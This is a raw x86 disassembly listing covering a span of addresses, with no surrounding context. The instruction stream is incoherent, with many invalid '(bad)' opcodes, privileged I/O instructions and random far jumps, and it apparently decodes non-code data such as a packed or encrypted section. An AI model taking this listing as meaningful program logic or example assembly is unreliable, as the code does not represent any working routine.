  4191ac:	mov    al,0x9f
  4191ae:	sub    al,0xfe
  4191b0:	mov    DWORD PTR [ebx],ebp
  4191b2:	addr16 out dx,al
  4191b4:	imul   BYTE PTR [edi-0x7634f997]
  4191ba:	sahf   
  4191bb:	sub    cl,BYTE PTR [ebx-0x4449fb80]
  4191c1:	or     DWORD PTR [ecx],ebx
  4191c3:	setbe  cl
  4191c6:	daa    
  4191c7:	rcr    BYTE PTR fs:[esp+edi*1+0x1e],0xbb
  4191cd:	rcr    DWORD PTR [edi+0x4741e5c],cl
  4191d3:	push   cs
  4191d4:	test   DWORD PTR [ecx-0x34],edx
  4191d7:	(bad)  ds:0xcc2768be
  4191dd:	sbb    al,0x5e
  4191df:	popf   
  4191e0:	pop    esi
  4191e1:	sbb    DWORD PTR [ebx+0x5d],eax
  4191e4:	pusha  
  4191e5:	mov    WORD PTR es:[eax],ds
  4191e8:	mov    ebp,0x84899ef3
  4191ed:	and    al,0xdf
  4191ef:	call   0xc1c28c16
  4191f4:	lods   al,BYTE PTR ds:[esi]
  4191f5:	mov    edi,0x7f7130a5
  4191fa:	fisttp WORD PTR [ebp+0x4e]
  4191fd:	mov    es,WORD PTR [ebp+0x34373eb1]
  419203:	mov    ah,0x32
  419205:	add    al,0xd4
  419207:	sub    esi,esi
  419209:	mov    ch,0x87
  41920b:	cmp    BYTE PTR ds:0xc25d23ae,ah
  419211:	int    0x91
  419213:	mov    dl,0x99
  419215:	adc    edi,DWORD PTR [ebp-0x6f276873]
  41921b:	cmp    eax,DWORD PTR [esi]
  41921d:	fisttp QWORD PTR [esi-0x743905b8]
  419223:	ret    0xffda
  419226:	(bad)  
  419227:	hlt    
  419228:	test   al,0xaa
  41922a:	je     0x4191b8
  41922c:	jnp    0x41920c
  41922e:	lds    edx,FWORD PTR [eax]
  419230:	es dec eax
  419232:	cmp    al,0x7d
  419234:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419236:	inc    edi
  419237:	adc    cl,bl
  419239:	mov    ebx,0xdf54b93c
  41923e:	inc    ebp
  41923f:	(bad)  
  419240:	add    al,0x34
  419242:	arpl   WORD PTR [ecx-0x28e566b5],bx
  419248:	pop    esp
  419249:	icebp  
  41924a:	ja     0x419299
  41924c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41924d:	cmc    
  41924e:	sbb    BYTE PTR [ebp+0x4cea1431],0x93
  419255:	sahf   
  419256:	mov    DWORD PTR [eax],ecx
  419258:	cmp    dl,ch
  41925a:	in     eax,dx
  41925b:	and    BYTE PTR [esi+0x42],dh
  41925e:	sahf   
  41925f:	xor    esp,DWORD PTR [edx]
  419261:	fnstsw WORD PTR [ecx]
  419263:	arpl   WORD PTR [edx],ax
  419265:	retf   0x939
  419268:	not    DWORD PTR [eax]
  41926a:	fisub  DWORD PTR [ecx-0x25dc6f01]
  419270:	sti    
  419271:	mov    eax,0x238b3df4
  419276:	xor    bl,dh
  419278:	enter  0x1c74,0x58
  41927c:	add    al,0x90
  41927e:	mov    ds:0xb9269241,al
  419283:	fist   DWORD PTR [edi-0x2a]
  419286:	xor    eax,0xb122d798
  41928b:	jge    0x4192ae
  41928d:	std    
  41928e:	sbb    BYTE PTR [eax-0x450e0f0c],cl
  419294:	icebp  
  419295:	and    esi,DWORD PTR [eax+ebx*1]
  419298:	push   esp
  419299:	sub    edx,DWORD PTR [edx+0xe6194bf]
  41929f:	mov    dl,BYTE PTR [eax+0x7c5aa445]
  4192a5:	mov    DWORD PTR [ebx],ebp
  4192a7:	pop    es
  4192a8:	xchg   BYTE PTR [ecx+0x2dd2fd68],bh
  4192ae:	xor    eax,0x2905b5a6
  4192b3:	adc    eax,0x26f244d3
  4192b8:	mov    ?,esp
  4192ba:	push   esi
  4192bb:	imul   edi,DWORD PTR [edi+0x5d],0x347df442
  4192c2:	(bad)  
  4192c3:	iret   
  4192c4:	inc    eax
  4192c5:	into   
  4192c6:	aaa    
  4192c7:	dec    ebx
  4192c8:	mov    BYTE PTR [ebp+0x4d],cl
  4192cb:	shl    DWORD PTR [ecx+0x67],1
  4192ce:	fmul   QWORD PTR [edx+edx*1-0x2d]
  4192d2:	or     al,0x55
  4192d4:	lods   eax,DWORD PTR ds:[esi]
  4192d5:	outs   dx,BYTE PTR ds:[esi]
  4192d6:	sub    al,0xf0
  4192d8:	mov    ss:0xa382dd5c,al
  4192de:	jle    0x4192f3
  4192e0:	arpl   WORD PTR [ebx+eiz*2+0x6f3bce68],si
  4192e7:	mov    ah,0x99
  4192e9:	xchg   edx,eax
  4192ea:	scas   eax,DWORD PTR es:[edi]
  4192eb:	jmp    0x3c2a:0x1d8d6340
  4192f2:	xchg   ebx,eax
  4192f3:	out    0xd0,eax
  4192f5:	and    al,0x7e
  4192f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192f8:	ret    
  4192f9:	stos   DWORD PTR es:[edi],eax
  4192fa:	shr    edx,1
  4192fc:	shl    DWORD PTR ds:0x9cbb4c25,0xd
  419303:	inc    esp
  419304:	mov    ebx,0xe3a0fa7b
  419309:	mov    DWORD PTR [ecx+0x273d7fa4],ebp
  41930f:	xchg   ecx,eax
  419310:	pop    es
  419311:	retf   
  419312:	cwde   
  419313:	arpl   WORD PTR [edi-0x3c8f772],sp
  419319:	int    0x44
  41931b:	imul   edx,esp,0x7bc00d85
  419321:	dec    eax
  419322:	mov    eax,gs
  419324:	in     eax,dx
  419325:	loop   0x4192fa
  419327:	out    dx,eax
  419328:	loopne 0x4192eb
  41932a:	jp     0x41936a
  41932c:	dec    ebp
  41932d:	retf   
  41932e:	mov    cl,0xbe
  419330:	punpckhwd mm7,QWORD PTR [ebx]
  419333:	add    WORD PTR [esi+0x51],sp
  419337:	push   es
  419338:	stos   DWORD PTR es:[edi],eax
  419339:	ins    BYTE PTR es:[edi],dx
  41933a:	out    dx,eax
  41933b:	popa   
  41933c:	dec    edi
  41933d:	or     al,0x57
  41933f:	and    eax,0x1ab918c
  419344:	push   ecx
  419345:	jg     0x4193c1
  419347:	xor    al,0xdb
  419349:	mov    DWORD PTR [ecx+edi*2-0x454d7494],ecx
  419350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419351:	loop   0x419301
  419353:	fild   WORD PTR [eax+0x63]
  419356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419357:	jle    0x419351
  419359:	add    al,0x5e
  41935b:	xor    cl,0x66
  41935e:	mov    ds:0x6811e3f6,eax
  419363:	data16 adc BYTE PTR [edx+0x2b],0xcb
  419368:	mov    bh,0x55
  41936a:	out    0x10,al
  41936c:	ret    0x6e08
  41936f:	add    dl,cl
  419371:	jno    0x4193bb
  419373:	or     DWORD PTR [eax+0x8],ebp
  419376:	enter  0x24e7,0xc
  41937a:	fiadd  WORD PTR [eax+eax*4]
  41937d:	inc    esi
  41937e:	adc    al,0xd1
  419380:	imul   BYTE PTR [esi+0x6a4ed7c6]
  419386:	(bad)  
  419387:	scas   al,BYTE PTR es:[edi]
  419388:	adc    al,0x7c
  41938a:	push   0xffffff8b
  41938c:	push   es
  41938d:	push   esp
  41938e:	sub    esi,DWORD PTR [eax]
  419390:	lds    ebx,FWORD PTR [edx]
  419392:	push   ecx
  419393:	sbb    eax,0x4b35a38b
  419398:	test   BYTE PTR [ebx],ah
  41939a:	aad    0x7e
  41939c:	gs pusha 
  41939e:	jmp    0x8c03:0xefda0091
  4193a5:	in     al,0xcb
  4193a7:	int    0xa3
  4193a9:	iret   
  4193aa:	mov    ebp,0xe5006efd
  4193af:	int3   
  4193b0:	fmul   DWORD PTR [edi]
  4193b2:	(bad)  
  4193b3:	xchg   esp,eax
  4193b4:	fadd   QWORD PTR [eax]
  4193b6:	or     BYTE PTR [edi],bh
  4193b8:	push   0xa56ab84d
  4193bd:	and    ebp,esp
  4193bf:	leave  
  4193c0:	jl     0x41939f
  4193c2:	xchg   edi,eax
  4193c3:	dec    ecx
  4193c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193c5:	and    DWORD PTR [esi],edx
  4193c7:	push   esi
  4193c8:	(bad)  
  4193c9:	lds    edi,FWORD PTR [edx+esi*1-0x70]
  4193cd:	mov    al,0xd7
  4193cf:	repnz mov ecx,DWORD PTR [edi]
  4193d2:	shl    eax,1
  4193d4:	in     eax,0x48
  4193d6:	or     BYTE PTR [eax+edi*4-0x74],dl
  4193da:	ja     0x419383
  4193dc:	ja     0x419360
  4193de:	enter  0x36d3,0x84
  4193e2:	pop    ebx
  4193e3:	pminub mm2,QWORD PTR [ecx-0x13bee700]
  4193ea:	xor    DWORD PTR [edx-0x3e],edx
  4193ed:	dec    ebp
  4193ee:	scas   al,BYTE PTR es:[edi]
  4193ef:	adc    ch,dh
  4193f1:	outs   dx,BYTE PTR ds:[esi]
  4193f2:	dec    ecx
  4193f3:	sbb    BYTE PTR [eax-0x61],ah
  4193f6:	outs   dx,DWORD PTR ds:[esi]
  4193f7:	in     al,dx
  4193f8:	ret    0x337b
  4193fb:	cmc    
  4193fc:	(bad)  
  4193fd:	lods   eax,DWORD PTR ds:[esi]
  4193fe:	add    edi,DWORD PTR [ecx]
  419400:	call   0x5f89:0x566af99b
  419407:	xchg   esi,eax
  419408:	jmp    edx
  41940a:	push   cs
  41940b:	cmc    
  41940c:	cwde   
  41940d:	test   BYTE PTR [edx+0x25825ba6],ch
  419413:	daa    
  419414:	and    ah,bl
  419416:	cmp    DWORD PTR [ebx],esi
  419418:	adc    BYTE PTR [esi-0x62],bh
  41941b:	data16 fwait
  41941d:	fwait
  41941e:	lds    ebx,FWORD PTR [edx-0x21b1cb82]
  419424:	xchg   DWORD PTR [ecx+0x4e],esi
  419427:	fld    QWORD PTR [eax]
  41942a:	das    
  41942b:	ja     0x419425
  41942d:	cmp    edx,DWORD PTR [edi-0x4a7dcce2]
  419433:	loopne 0x419401
  419435:	in     al,0xcb
  419437:	sbb    BYTE PTR cs:[ebx-0x47f45186],bl
  41943e:	out    0x6c,eax
  419440:	add    eax,0xf6077518
  419445:	mov    ds:0xfbb194d5,al
  41944a:	sbb    bl,BYTE PTR [edi-0x62]
  41944d:	rcl    BYTE PTR [esi],0x54
  419450:	pop    ebx
  419451:	xchg   ebx,eax
  419452:	dec    ebx
  419453:	fimul  WORD PTR [esi-0x3c]
  419456:	(bad)  
  419457:	sbb    ebp,esi
  419459:	mul    DWORD PTR [edi]
  41945b:	cwde   
  41945c:	push   cs
  41945d:	dec    ebp
  41945e:	fld    DWORD PTR [esi+0x663dc552]
  419464:	scas   eax,DWORD PTR es:[edi]
  419465:	push   0x49
  419467:	mov    ah,BYTE PTR [eax+0x6dea03ad]
  41946d:	hlt    
  41946e:	cmp    BYTE PTR [esi-0x4fabe1d0],bl
  419474:	cmp    DWORD PTR [edx+eax*8],0x12
  419478:	cwde   
  419479:	out    dx,al
  41947a:	call   0x6d16:0xc4ac3d9f
  419481:	pop    edi
  419482:	dec    ebx
  419483:	(bad)  
  419484:	or     ebp,ecx
  419486:	in     eax,dx
  419487:	xor    al,0xaa
  419489:	push   cs
  41948a:	mov    al,0x89
  41948c:	adc    DWORD PTR [ebx-0x33],ebp
  41948f:	add    al,BYTE PTR [eax]
  419491:	scas   eax,DWORD PTR es:[edi]
  419492:	jle    0x419482
  419494:	xor    BYTE PTR [esi],dh
  419496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419497:	inc    ebx
  419498:	inc    ebp
  419499:	mov    bh,0x7a
  41949b:	push   0xffffff97
  41949d:	test   edx,ecx
  41949f:	lock jp 0x419459
  4194a2:	mov    ah,0xde
  4194a4:	sbb    DWORD PTR [edx],edi
  4194a6:	ds add al,0xb7
  4194a9:	retf   0xa34a
  4194ac:	popf   
  4194ad:	jnp    0x4194e0
  4194af:	aaa    
  4194b0:	ins    BYTE PTR es:[edi],dx
  4194b1:	popa   
  4194b2:	mov    ebp,DWORD PTR [ebx]
  4194b4:	leave  
  4194b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194b6:	cwde   
  4194b7:	push   0x7c776048
  4194bc:	add    edx,DWORD PTR [edi-0xc7f27af]
  4194c2:	loopne 0x41949f
  4194c4:	das    
  4194c5:	pushf  
  4194c6:	sub    al,0x66
  4194c8:	les    ecx,FWORD PTR [ebx]
  4194ca:	add    edi,DWORD PTR [ebx]
  4194cc:	cmc    
  4194cd:	add    ecx,DWORD PTR [ebx-0x3fc51d80]
  4194d3:	mov    dh,0x93
  4194d5:	test   DWORD PTR [edx+0x16],edx
  4194d8:	sti    
  4194d9:	add    cl,0xf2
  4194dc:	fidiv  WORD PTR ds:[eax-0x4f2f22f0]
  4194e3:	imul   esp,DWORD PTR [ecx],0xffffffff
  4194e6:	cwde   
  4194e7:	(bad)  
  4194e8:	sub    BYTE PTR [edx+ebp*1+0x38fe259c],al
  4194ef:	ret    
  4194f0:	add    bl,dl
  4194f2:	aas    
  4194f3:	(bad)  [ecx+0x20]
  4194f6:	aam    0xed
  4194f8:	sub    edx,esi
  4194fa:	push   ecx
  4194fb:	pop    edx
  4194fc:	add    DWORD PTR [ecx],edx
  4194fe:	fmul   QWORD PTR [ebp+0x33]
  419501:	sbb    bl,dl
  419503:	inc    esi
  419504:	int    0xcc
  419506:	ror    BYTE PTR [ecx-0x796106f4],1
  41950c:	aaa    
  41950d:	addr16 mov ds:0xc1c1,al
  419511:	fisub  DWORD PTR [eax]
  419513:	icebp  
  419514:	lods   eax,DWORD PTR ds:[esi]
  419515:	(bad)  
  419516:	cmp    DWORD PTR [edx],ecx
  419518:	adc    DWORD PTR [edx+0x23],ebp
  41951b:	sbb    al,0x2a
  41951d:	neg    BYTE PTR [ebp-0x2f39ddd]
  419523:	mov    ecx,0x3cca0b1a
  419528:	xor    bl,dl
  41952a:	call   0xd791:0x266460ff
  419531:	or     eax,0xb416eb3e
  419536:	pop    edi
  419537:	lahf   
  419538:	jns    0x4194d3
  41953a:	test   al,0x2f
  41953c:	lahf   
  41953d:	stc    
  41953e:	mov    al,0xb4
  419540:	xlat   BYTE PTR ds:[ebx]
  419541:	neg    DWORD PTR [esi-0x4]
  419544:	test   DWORD PTR ds:0xec9bc56e,ebx
  41954a:	cdq    
  41954b:	in     al,dx
  41954c:	aas    
  41954d:	fdivr  QWORD PTR [ebx-0x76c38faa]
  419553:	icebp  
  419554:	rcr    DWORD PTR [edx+0x2639825],1
  41955a:	and    eax,0x5fa2b8b0
  41955f:	sahf   
  419560:	shl    BYTE PTR [eax],cl
  419562:	out    0x1d,eax
  419564:	inc    ecx
  419565:	(bad)  
  419566:	fiadd  DWORD PTR [ecx]
  419568:	aas    
  419569:	int3   
  41956a:	cmp    ebx,eax
  41956c:	popf   
  41956d:	sub    al,0xf8
  41956f:	and    al,0x77
  419571:	imul   esp,DWORD PTR [ebx+eax*4+0x8ca3377],0x59
  419579:	cwde   
  41957a:	cmp    al,al
  41957c:	(bad)  
  41957d:	ficom  DWORD PTR [edx]
  41957f:	dec    ecx
  419580:	sar    DWORD PTR [eax+0x2f],1
  419583:	icebp  
  419584:	fadd   st(6),st
  419586:	mov    ch,0xb0
  419588:	jb     0x41958f
  41958a:	mov    al,0xc3
  41958c:	mov    cl,0x1d
  41958e:	cmp    al,0x56
  419590:	leave  
  419591:	scas   al,BYTE PTR es:[edi]
  419592:	push   es
  419593:	push   cs
  419594:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419595:	push   ebp
  419596:	imul   esi,DWORD PTR [esp+ecx*8+0x66995eef],0xffffff8d
  41959e:	inc    edi
  41959f:	dec    eax
  4195a0:	js     0x41958e
  4195a2:	das    
  4195a3:	rcl    BYTE PTR [edi-0x6],0x72
  4195a7:	int    0xc
  4195a9:	out    0x81,eax
  4195ab:	xchg   edx,eax
  4195ac:	push   es
  4195ad:	push   esp
  4195ae:	xchg   eax,esi
  4195b0:	pusha  
  4195b1:	or     DWORD PTR [edi-0x67],0x16
  4195b5:	setb   dl
  4195b8:	xor    ch,bh
  4195ba:	out    dx,al
  4195bb:	push   es
  4195bc:	xchg   esp,eax
  4195bd:	pop    esp
  4195be:	inc    esi
  4195bf:	js     0x419636
  4195c1:	jae    0x419566
  4195c3:	cmp    dl,BYTE PTR [ebx+0x47a06543]
  4195c9:	setg   BYTE PTR [eax-0x30]
  4195cd:	sar    DWORD PTR [eax],cl
  4195cf:	imul   edx,DWORD PTR [eax+0x4a],0xb0b6d46a
  4195d6:	hlt    
  4195d7:	sub    DWORD PTR [eax+0x7f],eax
  4195da:	outs   dx,BYTE PTR ds:[esi]
  4195db:	mov    dl,0x1c
  4195dd:	and    BYTE PTR [edx+0x2483a3dd],dl
  4195e3:	stos   DWORD PTR es:[edi],eax
  4195e4:	dec    edx
  4195e5:	ins    DWORD PTR es:[edi],dx
  4195e6:	mov    dl,0x9c
  4195e8:	jg     0x4195a1
  4195ea:	cmc    
  4195eb:	push   ebp
  4195ec:	cwde   
  4195ed:	mov    esp,0x5559d39d
  4195f2:	jbe    0x4195ef
  4195f4:	xchg   edx,eax
  4195f5:	mov    eax,0x4a6b876b
  4195fa:	push   edx
  4195fb:	or     bl,BYTE PTR [ebx+0x3ea4f2a5]
  419601:	loopne 0x4195b8
  419603:	and    DWORD PTR [edx+0x380988c1],ebp
  419609:	sbb    al,0xcf
  41960b:	mov    edi,0x6c392830
  419610:	xor    eax,0x2c00bcd5
  419615:	std    
  419616:	adc    al,0xa7
  419618:	into   
  419619:	fistp  DWORD PTR [edx+0x168391be]
  41961f:	mov    esp,0xef7edf97
  419624:	cld    
  419625:	pop    ecx
  419626:	sub    edi,ebx
  419628:	(bad)  
  419629:	inc    edx
  41962a:	scas   eax,DWORD PTR es:[edi]
  41962b:	xor    al,0x10
  41962d:	loop   0x41967a
  41962f:	in     al,0x68
  419631:	mov    dl,0xe3
  419633:	js     0x41969f
  419635:	das    
  419636:	mov    ds:0x3efcf827,eax
  41963b:	xchg   edi,eax
  41963c:	mov    ebx,DWORD PTR [ebx+0xb]
  41963f:	sub    DWORD PTR [ecx],eax
  419641:	into   
  419642:	in     eax,dx
  419643:	jbe    0x419655
  419645:	cmp    ch,dl
  419647:	stc    
  419648:	outs   dx,DWORD PTR ds:[esi]
  419649:	call   0xb9b0:0x9b3fc693
  419650:	and    dh,dh
  419652:	push   ebp
  419653:	cmp    al,0x55
  419655:	and    dh,BYTE PTR [eax]
  419657:	(bad)  [esi]
  419659:	int    0x37
  41965b:	cmpxchg DWORD PTR [esi-0x4ad628c4],edx
  419662:	sbb    cl,BYTE PTR [eax]
  419664:	sahf   
  419665:	stc    
  419666:	lahf   
  419667:	retf   
  419668:	cmc    
  419669:	std    
  41966a:	lock stc 
  41966c:	and    al,0x51
  41966e:	add    dl,BYTE PTR [ebp+0x14]
  419671:	stc    
  419672:	mov    eax,ds:0xf0541701
  419677:	xor    al,0x31
  419679:	adc    eax,0x975afcaf
  41967e:	cs jbe 0x419609
  419681:	jae    0x41968d
  419683:	sub    al,BYTE PTR [ebp-0x7ba2b212]
  419689:	sub    BYTE PTR [esi+0x5d0ed1e7],0x7f
  419690:	in     al,dx
  419691:	mov    bl,0x3f
  419693:	(bad)  
  419694:	fnstsw WORD PTR ds:0xab5732de
  41969a:	mov    ds:0x1b526664,al
  41969f:	inc    edx
  4196a0:	bound  ebx,QWORD PTR [esi]
  4196a2:	rcl    BYTE PTR [ebx],1
  4196a4:	cmp    BYTE PTR [ecx+0x5e753a6b],0x23
  4196ab:	idiv   DWORD PTR [ebp+0x7ec581d8]
  4196b1:	add    ch,bl
  4196b3:	mov    cl,0x7e
  4196b5:	xor    BYTE PTR [ebp-0x4e29d1cc],bh
  4196bb:	mov    ch,BYTE PTR [eax]
  4196bd:	loop   0x4196ae
  4196bf:	test   eax,ecx
  4196c1:	dec    ecx
  4196c2:	cmp    BYTE PTR [esi-0x4d],ch
  4196c5:	cmc    
  4196c6:	fisub  WORD PTR [ebp-0x767e8b63]
  4196cc:	push   ds
  4196cd:	(bad)  
  4196ce:	mov    dh,0xb2
  4196d0:	mov    al,ds:0xf64cef8c
  4196d5:	or     esi,ecx
  4196d7:	mov    ds:0xae9a36b4,al
  4196dc:	mov    edi,0xd082e7bf
  4196e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196e2:	bound  ebp,QWORD PTR [ecx+0x66ef21d5]
  4196e8:	fdivr  QWORD PTR [eax+edx*4-0x66]
  4196ec:	(bad)  
  4196ed:	mov    ecx,0x62abc7f4
  4196f2:	dec    edx
  4196f3:	ror    DWORD PTR [eax],0xc2
  4196f6:	sub    eax,0x44e4014
  4196fb:	cld    
  4196fc:	into   
  4196fd:	adc    BYTE PTR [esi],cl
  4196ff:	inc    esp
  419700:	mov    WORD PTR [ebx-0x51],cs
  419703:	add    BYTE PTR [ebp+0x3],0x31
  419707:	jns    0x419702
  419709:	or     DWORD PTR [ebp-0x6eef69ec],edx
  41970f:	and    eax,0x42e900df
  419714:	pushf  
  419715:	(bad)  
  419716:	dec    edi
  419717:	(bad)  
  419718:	lock fadd st(2),st
  41971b:	jne    0x4196fa
  41971d:	neg    DWORD PTR [eax-0x5e]
  419720:	into   
  419721:	dec    esp
  419722:	loopne 0x4196da
  419724:	inc    eax
  419725:	and    ebx,DWORD PTR [ebx-0x31]
  419728:	jge    0x419782
  41972a:	inc    esi
  41972b:	adc    BYTE PTR [ebp+0x1a],0x3b
  41972f:	(bad)  
  419730:	dec    esp
  419731:	adc    BYTE PTR [eax],al
  419733:	mov    edi,0xe680012c
  419738:	mov    dl,0x40
  41973a:	and    ebx,DWORD PTR [ebp-0x35]
  41973d:	enter  0x4313,0x61
  419741:	or     DWORD PTR [edx-0x48f01552],esp
  419747:	mov    esi,0x50eb2355
  41974c:	jl     0x419732
  41974e:	cmc    
  41974f:	jb     0x419734
  419751:	xchg   ebp,eax
  419752:	add    eax,0x71313f6
  419757:	int    0x28
  419759:	aam    0xa0
  41975b:	xchg   ebx,eax
  41975c:	sbb    ah,cl
  41975e:	jmp    0x6c71:0x196f8d37
  419765:	jne    0x419783
  419767:	(bad)  
  419768:	and    al,0xdd
  41976a:	aad    0xc3
  41976c:	mov    ds:0x7bf026cd,eax
  419771:	dec    esp
  419772:	retf   
  419773:	and    BYTE PTR ds:0xcbab122f,ah
  419779:	dec    eax
  41977a:	pop    ebp
  41977b:	xlat   BYTE PTR ds:[ebx]
  41977c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41977d:	pop    ecx
  41977e:	mov    eax,ds:0xb622c953
  419783:	adc    eax,0x26f1fbc4
  419788:	xchg   ebp,eax
  419789:	jns    0x419718
  41978b:	shl    DWORD PTR [esi+0x4d84f457],0xba
  419792:	in     al,0x45
  419794:	mov    ebx,0x9bc76547
  419799:	adc    esi,ecx
  41979b:	pop    edx
  41979c:	jle    0x419807
  41979e:	mov    BYTE PTR [edi-0x6e997ea7],bh
  4197a4:	mov    ch,0x33
  4197a6:	pop    eax
  4197a7:	shl    BYTE PTR [edi-0x4],cl
  4197aa:	ja     0x419730
  4197ac:	add    DWORD PTR [eax],ecx
  4197ae:	cmp    esp,DWORD PTR [ecx]
  4197b0:	pop    es
  4197b1:	ret    
  4197b2:	cmp    ecx,DWORD PTR [edi-0x2f]
  4197b5:	test   al,0x95
  4197b7:	xchg   esp,eax
  4197b8:	jl     0x41976b
  4197ba:	popa   
  4197bb:	and    DWORD PTR [eax],esp
  4197bd:	jle    0x4197bb
  4197bf:	fsubr  QWORD PTR [eax-0x39]
  4197c2:	jae    0x4197d1
  4197c4:	cmp    BYTE PTR [edx],0xeb
  4197c7:	mov    WORD PTR [ecx+ebx*4+0x73],ss
  4197cb:	cs jno 0x419817
  4197ce:	xchg   esp,eax
  4197cf:	aas    
  4197d0:	lods   al,BYTE PTR ds:[esi]
  4197d1:	shl    edi,0x97
  4197d4:	pop    ecx
  4197d5:	or     BYTE PTR [edi-0x6f71e7f2],dh
  4197db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197dc:	adc    ch,bl
  4197de:	push   eax
  4197df:	cmp    dl,cl
  4197e1:	xchg   edx,eax
  4197e2:	dec    edx
  4197e3:	pop    ss
  4197e4:	and    al,0x50
  4197e6:	dec    eax
  4197e7:	jg     0x41980e
  4197e9:	lods   al,BYTE PTR ds:[esi]
  4197ea:	inc    ebx
  4197eb:	adc    DWORD PTR [edx+0x535866f0],0x21
  4197f2:	shl    DWORD PTR [ecx+0x197e6cb],0x37
  4197f9:	js     0x4197f1
  4197fb:	cmp    al,0x58
  4197fd:	into   
  4197fe:	cmp    eax,0xbd8dd30d
  419803:	dec    ebx
  419804:	xor    al,0x9b
  419806:	push   esp
  419807:	(bad)  
  419808:	xchg   ecx,eax
  419809:	retf   0x2fcc
  41980c:	ins    DWORD PTR es:[edi],dx
  41980d:	(bad)  ds:0xa76ea8fe
  419813:	scas   eax,DWORD PTR es:[edi]
  419814:	shl    BYTE PTR [ebp-0x71ff8501],1
  41981a:	push   es
  41981b:	out    0x16,al
  41981d:	inc    edx
  41981e:	fdiv   QWORD PTR [edi]
  419820:	cmp    eax,0x568e8485
  419825:	aas    
  419826:	lock add al,BYTE PTR [edi]
  419829:	(bad)  
  41982a:	int    0x95
  41982c:	stc    
  41982d:	shl    BYTE PTR [eax],0xf2
  419830:	fwait
  419831:	sbb    al,0xb7
  419833:	mov    ch,bl
  419835:	ret    
  419836:	shl    BYTE PTR [edi-0x41],1
  419839:	mov    ebx,DWORD PTR [ebp-0x1e748524]
  41983f:	les    ebx,FWORD PTR [eax]
  419841:	xchg   edx,eax
  419842:	cmp    BYTE PTR [ebp-0x13],dl
  419845:	shr    DWORD PTR [eax-0x48236117],cl
  41984b:	js     0x41983b
  41984d:	xchg   ebx,eax
  41984e:	ror    esi,0x7f
  419851:	cli    
  419852:	mov    ds:0xe6316f93,al
  419857:	cdq    
  419858:	push   eax
  419859:	test   al,0xd5
  41985b:	push   0xffffffa3
  41985d:	inc    edx
  41985e:	push   eax
  41985f:	xchg   ebp,eax
  419860:	out    0xbe,eax
  419862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419863:	out    0x70,eax
  419865:	sahf   
  419866:	sub    ecx,DWORD PTR [eax-0x4f]
  419869:	fnsave [eax-0x71aa7164]
  41986f:	and    eax,0xd82dce59
  419874:	into   
  419875:	xchg   edx,eax
  419876:	(bad)  
  419877:	xor    al,BYTE PTR [esp+ecx*4]
  41987a:	enter  0x9254,0x19
  41987e:	fwait
  41987f:	push   ebp
  419880:	xor    BYTE PTR [edx],al
  419882:	dec    esi
  419883:	inc    ebx
  419884:	push   eax
  419885:	fcmovnb st,st(5)
  419887:	inc    edi
  419888:	sub    edi,ecx
  41988a:	add    ebp,DWORD PTR [esi-0x12]
  41988d:	xchg   ecx,eax
  41988e:	stc    
  41988f:	pop    ebp
  419890:	sub    eax,0x5dcf2b64
  419895:	dec    ebx
  419896:	cmp    eax,0xbc44bfcc
  41989b:	(bad)  
  41989c:	add    eax,0x4ce95c0a
  4198a1:	faddp  st(6),st
  4198a3:	ins    BYTE PTR es:[edi],dx
  4198a4:	pop    edx
  4198a5:	pop    ecx
  4198a6:	dec    ebx
  4198a7:	in     al,dx
  4198a8:	jno    0x4198b2
  4198aa:	pop    eax
  4198ab:	push   es
  4198ac:	pop    esi
  4198ad:	rol    DWORD PTR [ecx],0xfb
  4198b0:	xchg   ebp,eax
  4198b1:	and    eax,0x664eae7b
  4198b6:	popa   
  4198b7:	(bad)  
  4198b8:	repnz inc eax
  4198ba:	mov    bh,0x0
  4198bc:	ret    0x488b
  4198bf:	sbb    ebx,DWORD PTR [esi]
  4198c1:	outs   dx,BYTE PTR ds:[esi]
  4198c2:	jne    0x419906
  4198c4:	jo     0x4198ca
  4198c6:	mov    DWORD PTR [edi],edx
  4198c8:	and    DWORD PTR [edi+0x16b4233f],esp
  4198ce:	push   ebx
  4198cf:	push   esi
  4198d0:	lods   al,BYTE PTR ds:[esi]
  4198d1:	jo     0x4198d2
  4198d3:	jae    0x419946
  4198d5:	add    al,BYTE PTR [edi-0x1]
  4198d8:	test   ebp,0xa533d048
  4198de:	xor    DWORD PTR [edx],0x33
  4198e1:	xchg   ebx,eax
  4198e2:	pop    eax
  4198e3:	or     DWORD PTR [ecx],eax
  4198e5:	(bad)  
  4198e6:	cs push edi
  4198e8:	daa    
  4198e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198ea:	xor    BYTE PTR [ecx+0x71d48223],ch
  4198f0:	jnp    0x4198f1
  4198f2:	test   bh,al
  4198f4:	ds ja  0x41991e
  4198f7:	push   esi
  4198f8:	inc    ebp
  4198f9:	dec    esi
  4198fa:	adc    al,0xc4
  4198fc:	adc    BYTE PTR [edi-0x45],bl
  4198ff:	xor    BYTE PTR [esp+ebx*4],bh
  419902:	or     eax,0xa2b44a8
  419907:	loope  0x419967
  419909:	and    eax,0xdb51b26b
  41990e:	or     al,0x25
  419910:	jnp    0x4198be
  419912:	pop    es
  419913:	pop    ecx
  419914:	and    eax,DWORD PTR [ebp+0x65]
  419917:	mov    ds:0xa4b1899e,al
  41991c:	ret    0xabce
  41991f:	and    DWORD PTR ds:[esi-0x7d],ebx
  419923:	outs   dx,DWORD PTR ds:[esi]
  419924:	aad    0x1b
  419926:	push   ds
  419927:	jp     0x419902
  419929:	jecxz  0x4198b1
  41992b:	mov    bh,0xd9
  41992d:	and    eax,0x6844b6e4
  419932:	adc    DWORD PTR [ebx+ecx*1],edi
  419935:	dec    ecx
  419936:	xchg   esp,eax
  419937:	stos   BYTE PTR es:[edi],al
  419938:	sar    BYTE PTR [edx-0x159bcf86],cl
  41993e:	into   
  41993f:	pop    ebp
